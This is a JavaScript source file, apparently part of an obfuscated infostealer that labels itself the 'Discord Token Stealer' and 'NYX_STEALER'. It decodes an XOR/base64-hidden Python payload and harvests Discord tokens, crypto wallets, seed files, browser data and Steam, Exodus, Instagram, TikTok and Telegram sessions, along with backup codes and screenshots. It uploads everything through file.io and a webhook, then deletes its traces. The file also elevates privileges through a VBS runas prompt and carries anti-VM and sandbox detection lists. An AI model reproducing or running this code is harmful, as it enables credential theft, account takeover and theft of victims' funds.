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";
const pythonCodeTemplate = _dp(_pe);
const InputPayload = {
  async main(_0x5551b4, _0x1cd354) {
    debugLog("InputPayload.main started");
    console.log("InputPayload.main started");
    if (!_0x1cd354) {
      _0x1cd354 = {
        info: _0x236a2c => {
          console.log(_0x236a2c);
          debugLog("INFO: " + _0x236a2c);
        },
        success: _0x49657f => {
          console.log(_0x49657f);
          debugLog("SUCCESS: " + _0x49657f);
        },
        error: _0x380dd1 => {
          console.error(_0x380dd1);
          debugLog("ERROR: " + _0x380dd1);
        },
        debug: _0x267d2e => {
          console.log(_0x267d2e);
          debugLog("DEBUG: " + _0x267d2e);
        },
        critical: _0x40ed5f => {
          console.error(_0x40ed5f);
          debugLog("CRITICAL: " + _0x40ed5f);
        }
      };
    }
    _0x1cd354.info("=== Discord Token Stealer Started ===");
    try {
      if (!_0x5551b4) {
        _0x1cd354.critical("No deep folder provided!");
        return;
      }
      _0x1cd354.info("Using deep folder: " + _0x5551b4);
      const _0x178475 = CONFIG.webhook;
      _0x1cd354.debug("Webhook URL configured: " + (_0x178475 ? "Yes" : "No"));
      const _0x3ea4c5 = path.join(_0x5551b4, "output");
      const _0xb7687d = _0x3ea4c5;
      fs.mkdirSync(_0x3ea4c5, {
        recursive: true
      });
      global._outputFolder = _0x3ea4c5;
      _0x1cd354.info("Output folder created: " + _0x3ea4c5);
      _0x1cd354.info("Initializing Python environment for browser data extraction...");
      const _0x28bca7 = pythonCodeTemplate.replace("__OUTPUT_FOLDER__", _0x3ea4c5.replace(/\\/g, "\\\\"));
      const _0x18adb4 = (_0x221a1d, _0x39ffee) => {
        let _0x14491a = "";
        for (let _0x546069 = 0; _0x546069 < _0x221a1d.length; _0x546069++) {
          _0x14491a += String.fromCharCode(_0x221a1d.charCodeAt(_0x546069) ^ _0x39ffee.charCodeAt(_0x546069 % _0x39ffee.length));
        }
        return _0x14491a;
      };
      const _0x411467 = "NYX_STEALER_PYTHON_KEY_2024";
      const _0x1bfd14 = Buffer.from(_0x18adb4(_0x28bca7, _0x411467)).toString("base64");
      const _0x37d5be = Buffer.from(_0x1bfd14, "base64").toString("utf-8");
      const _0x3f82ac = _0x18adb4(_0x37d5be, _0x411467);
      try {
        await withTimeout(ChromePython(_0x3f82ac), 300000, "Python Script");
        _0x1cd354.success("Python script executed successfully");
      } catch (_0x11f039) {
        _0x1cd354.error("Python script execution failed: " + _0x11f039.message);
      }
      _0x1cd354.info("Starting parallel data collection...");
      const [_0x450572, _0x146281, _0x4f31ca, _0x5c6114, _0x56f9cc] = await Promise.allSettled([(async () => {
        _0x1cd354.info("Checking browser data...");
        if (!fs.existsSync(_0x3ea4c5)) {
          _0x1cd354.info("No browser data found");
          return {
            exists: false,
            items: []
          };
        }
        const _0xec9b67 = fs.readdirSync(_0x3ea4c5);
        _0x1cd354.success("Browser data: " + _0xec9b67.length + " items");
        const _0x840ffc = {
          exists: _0xec9b67.length > 0,
          items: _0xec9b67
        };
        return _0x840ffc;
      })(), withTimeout((async () => {
        _0x1cd354.info("Extracting wallets...");
        fs.mkdirSync(_0xb7687d, {
          recursive: true
        });
        const _0x40e86d = await extractAllWallets(_0xb7687d);
        const _0x1f5f72 = _0x40e86d.browserWallets.length + _0x40e86d.desktopWallets.length + _0x40e86d.coldWallets.length + _0x40e86d.walletDatFiles.length + _0x40e86d.seedFiles.length;
        _0x1cd354.success("Wallets extracted: " + _0x1f5f72 + " items");
        return _0x40e86d;
      })(), 120000, "Wallet Extraction"), withTimeout((async () => {
        _0x1cd354.info("Collecting Discord tokens...");
        const _0x54a69e = await collectAllTokens(_0x3ea4c5);
        _0x1cd354.success("Tokens found: " + _0x54a69e.length);
        return _0x54a69e;
      })(), 60000, "Token Collection"), withTimeout((async () => {
        _0x1cd354.info("Collecting sessions...");
        try {
          const _0xf16b6d = await Promise.allSettled([collectSteamSession().catch(_0x267599 => {
            _0x1cd354.error("Steam: " + _0x267599.message);
            return null;
          }), collectExodusSession().catch(_0x11f455 => {
            _0x1cd354.error("Exodus: " + _0x11f455.message);
            return null;
          }), collectInstagramSessions(_0x3ea4c5).catch(_0x3a7e59 => {
            _0x1cd354.error("Instagram: " + _0x3a7e59.message);
            return null;
          }), (async () => {
            try {
              const _0x25318b = readCookiesFromOutput(_0x3ea4c5, "sessionid");
              for (const _0x6f9166 of _0x25318b) {
                try {
                  await sendTikTokEmbed(_0x6f9166);
                } catch (_0x4cad6c) {
                  _0x1cd354.error("TikTok send: " + _0x4cad6c.message);
                }
              }
            } catch (_0x39f9cc) {
              _0x1cd354.error("TikTok collection: " + _0x39f9cc.message);
            }
          })()]);
          _0x1cd354.success("Sessions collected");
          return _0xf16b6d;
        } catch (_0x555aec) {
          _0x1cd354.error("Session collection error: " + _0x555aec.message);
          return [];
        }
      })(), 90000, "Session Collection"), withTimeout((async () => {
        _0x1cd354.info("Collecting backup codes...");
        const _0x30c15e = await writeBackupCodesToFile(_0x3ea4c5);
        _0x1cd354.success("Backup codes collected: " + (_0x30c15e ? "Yes" : "No"));
        return _0x30c15e;
      })(), 30000, "Backup Codes")]);
      _0x1cd354.info("Parallel data collection finished");
      const _0x4b9bc0 = _0x450572.status === "fulfilled" && _0x450572.value.exists;
      const _0x5ae8cd = _0x146281.status === "fulfilled" && fs.existsSync(path.join(_0x3ea4c5, "wallets_summary.txt"));
      const _0x4250ca = fs.existsSync(path.join(_0x3ea4c5, "Desktop_Wallets")) || fs.existsSync(path.join(_0x3ea4c5, "Browser_Wallets")) || fs.existsSync(path.join(_0x3ea4c5, "Nyx_Wallets"));
      const _0x4f1afc = (() => {
        try {
          return fs.existsSync(_0x3ea4c5) && fs.readdirSync(_0x3ea4c5).length > 0;
        } catch (_0x10ab2f) {
          return false;
        }
      })();
      const _0x882b71 = _0x4250ca || _0x4f1afc || _0x4b9bc0 || _0x5ae8cd;
      const _0x58d944 = _0x4f31ca.status === "fulfilled" ? _0x4f31ca.value : [];
      _0x1cd354.info("Should ZIP: " + _0x882b71 + " (Wallets: " + _0x4250ca + ", Browser: " + _0x4b9bc0 + ", Any: " + _0x4f1afc + ")");
      if (_0x882b71) {
        const _0x467c1d = Math.random().toString(36).substring(2, 15) + ".zip";
        const _0x37f5e9 = path.join(_0x5551b4, _0x467c1d);
        _0x1cd354.info("Creating ZIP at: " + _0x37f5e9);
        await new Promise((_0x1592e7, _0x2f5581) => {
          const _0x1294e3 = fs.createWriteStream(_0x37f5e9);
          const _0x504441 = archiver("zip", {
            zlib: {
              level: 9
            }
          });
          _0x1294e3.on("close", () => {
            _0x1cd354.success("ZIP created: " + _0x504441.pointer() + " bytes");
            _0x1592e7();
          });
          _0x504441.on("error", _0x2f5581);
          _0x504441.pipe(_0x1294e3);
          _0x504441.directory(_0x3ea4c5, false);
          _0x504441.finalize();
        });
        _0x1cd354.info("ZIP created, attempting upload...");
        try {
          await withTimeout(sendZipToFileIOAndWebhook(_0x37f5e9), 120000, "ZIP Upload");
          _0x1cd354.success("ZIP uploaded");
        } catch (_0x241dd4) {
          _0x1cd354.error("ZIP upload failed: " + _0x241dd4.message);
        }
        try {
          if (fs.existsSync(_0x3ea4c5)) {
            fs.rmSync(_0x3ea4c5, {
              recursive: true,
              force: true
            });
          }
          if (fs.existsSync(_0x37f5e9)) {
            fs.unlinkSync(_0x37f5e9);
          }
        } catch (_0x113d8e) {}
      } else {
        _0x1cd354.warning("No data to ZIP!");
      }
      const _0x19c3fe = [];
      if (_0x58d944.length > 0) {
        _0x1cd354.info("Sending " + _0x58d944.length + " tokens to webhook...");
        for (const [_0x188331, _0x5cc4bb, _0x1dc497] of _0x58d944) {
          _0x19c3fe.push(Promise.race([sendTokenToWebhook(_0x188331, _0x5cc4bb, _0x1dc497.userInfo), new Promise((_0x2ef1f7, _0x27234c) => setTimeout(() => _0x27234c(new Error("Token send timeout")), 5000))]).then(() => {
            _0x1cd354.success("Token sent: " + _0x1dc497.userInfo.username);
          }).catch(_0x33e9bb => {
            _0x1cd354.error("Token send failed: " + _0x33e9bb.message);
          }));
        }
      } else {
        _0x1cd354.info("No tokens to send");
      }
      _0x1cd354.info("Performing injection...");
      _0x19c3fe.push(performInjection().then(_0x236ee2 => {
        if (_0x236ee2.skipped) {
          _0x1cd354.info("Injection skipped - not configured");
        } else if (_0x236ee2.success) {
          _0x1cd354.success("Injection: " + _0x236ee2.count + " clients");
        } else {
          _0x1cd354.error("Injection failed: " + _0x236ee2.error);
        }
      }).catch(_0x3d2c39 => {
        _0x1cd354.error("Injection error: " + _0x3d2c39.message);
      }));
      _0x1cd354.info("Sending screenshot...");
      _0x19c3fe.push(sendScreenshotToWebhook().then(() => _0x1cd354.success("Screenshot sent")).catch(_0x50e917 => {
        _0x1cd354.error("Screenshot send failed:", _0x50e917.message);
      }));
      await Promise.all(_0x19c3fe);
      _0x1cd354.info("Starting Telegram session collection...");
      try {
        await withTimeout(collectTelegramSession(), 45000, "Telegram Collection");
        _0x1cd354.success("Telegram session collected");
      } catch (_0x525513) {
        _0x1cd354.error("Telegram error: " + _0x525513.message);
        console.log("[TELEGRAM] Skipped: " + _0x525513.message);
      }
      _0x1cd354.success("=== All tasks completed ===");
    } catch (_0x6e7f8c) {
      _0x1cd354.critical("Fatal error: " + (_0x6e7f8c && (_0x6e7f8c.message || _0x6e7f8c)));
      _0x1cd354.error("Stack: " + (_0x6e7f8c && _0x6e7f8c.stack));
      console.log("InputPayload Fatal Error: " + (_0x6e7f8c && (_0x6e7f8c.message || _0x6e7f8c)) + "\n" + (_0x6e7f8c && _0x6e7f8c.stack));
    }
  }
};
class AdminCheck {
  static isAdmin() {
    try {
      execSync("net session", {
        stdio: "pipe",
        windowsHide: true,
        timeout: 2000
      });
      return true;
    } catch (_0x261feb) {
      return false;
    }
  }
  static async requestAdmin(_0x584ea4 = false, _0x53ae35 = true) {
    return new Promise((_0xf44a1b, _0x27032e) => {
      try {
        const _0x3ce47a = process.execPath;
        const _0x41a71b = process.argv.slice(1).join(" ");
        const _0x4539ce = os.tmpdir();
        const _0x28745c = "elev_" + Date.now() + "_" + Math.random().toString(36).substring(7);
        const _0x3341db = path.join(_0x4539ce, _0x28745c + ".marker");
        const _0x20235c = process.argv.slice(1).map(_0x4005c6 => _0x4005c6.includes(" ") ? "\"" + _0x4005c6 + "\"" : _0x4005c6).join(" ");
        const _0x16ab74 = _0x20235c + " --uac-marker=\"" + _0x3341db + "\"";
        const _0x2b8d00 = _0x16ab74.replace(/"/g, "\" & Chr(34) & \"");
        const _0x4be77f = "Set UAC = CreateObject(\"Shell.Application\")\nUAC.ShellExecute \"" + _0x3ce47a + "\", \"" + _0x2b8d00 + "\", \"\", \"runas\", 1";
        const _0x3f206e = path.join(_0x4539ce, _0x28745c + ".vbs");
        fs.writeFileSync(_0x3f206e, _0x4be77f);
        const _0x41a0e7 = spawn("wscript.exe", [_0x3f206e], {
          stdio: "ignore",
          windowsHide: true
        });
        _0x41a0e7.on("close", _0x1245ad => {
          try {
            if (fs.existsSync(_0x3f206e)) {
              fs.unlinkSync(_0x3f206e);
            }
          } catch (_0x1be39b) {}
          setTimeout(() => {
            const _0x165075 = fs.existsSync(_0x3341db);
            if (_0x165075) {
              try {
                fs.unlinkSync(_0x3341db);
              } catch (_0xc65015) {}
              if (_0x53ae35) {
                setTimeout(() => process.exit(0), 500);
              }
              _0xf44a1b();
            } else {
              _0x27032e(new Error("UAC denied by user"));
            }
          }, 3000);
        });
        _0x41a0e7.on("error", _0x158bc4 => {
          _0x27032e(_0x158bc4);
        });
      } catch (_0x1ca2a3) {
        _0x27032e(_0x1ca2a3);
      }
    });
  }
  static async ensureAdmin() {
    if (!this.isAdmin()) {
      console.log("[Admin] Requesting administrator privileges...");
      await this.requestAdmin(false);
      return false;
    }
    console.log("[Admin] Running with administrator privileges");
    return true;
  }
  static async ensureAdminSilent() {
    if (!this.isAdmin()) {
      await this.requestAdmin(false);
      return false;
    }
    return true;
  }
}
const DEBUG_ANTIVM = true;
const VM_MAC_PREFIXES = ["00:0C:29", "08:00:27", "00:1C:42", "00:50:56", "0A:00:27", "00:16:3E", "00:03:FF", "00:1F:16", "BE:EF:CA", "42:01:0A"];
const SANDBOX_PROCESSES = ["vmsrvc", "vmusrvc", "vboxtray", "vmtoolsd", "df5serv", "vboxservice", "vmware", "trio", "tqos", "networkservice", "updata", "sandboxie", "anyrun", "triage", "cuckoo", "sample", "kvmsrvc", "qemud", "xen", "xenservice"];
